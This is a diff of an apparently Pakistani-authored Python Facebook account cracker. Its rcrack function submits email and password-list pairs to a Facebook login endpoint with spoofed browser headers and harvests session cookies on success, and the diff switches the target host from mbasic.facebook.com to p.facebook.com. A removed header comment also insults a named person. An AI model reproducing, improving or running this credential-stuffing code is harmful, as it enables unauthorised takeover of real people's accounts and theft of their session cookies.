@@ -1,5 +1,4 @@
-#assalamowalikom OPEN source by Harry (Haris AKHTAR )
-#Fuck YATEEM kid AWAIS tahir 
+ 
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 g1=('A');g2=('K');g3=('I');g4=('N');g5=('G');g6=('1');g7=('1');g8=('0');pr=('-P');pr1=('R');pr2=('O')
 ghb=g1+g2+g3+g4+g5+g6+g7+g8
@@ -853,7 +852,7 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'mbasic.facebook.com',
+			header_freefb = {'authority':'p.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'en-US,en;q=0.8',
@@ -867,7 +866,7 @@ def rcrack(ids,passlist):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
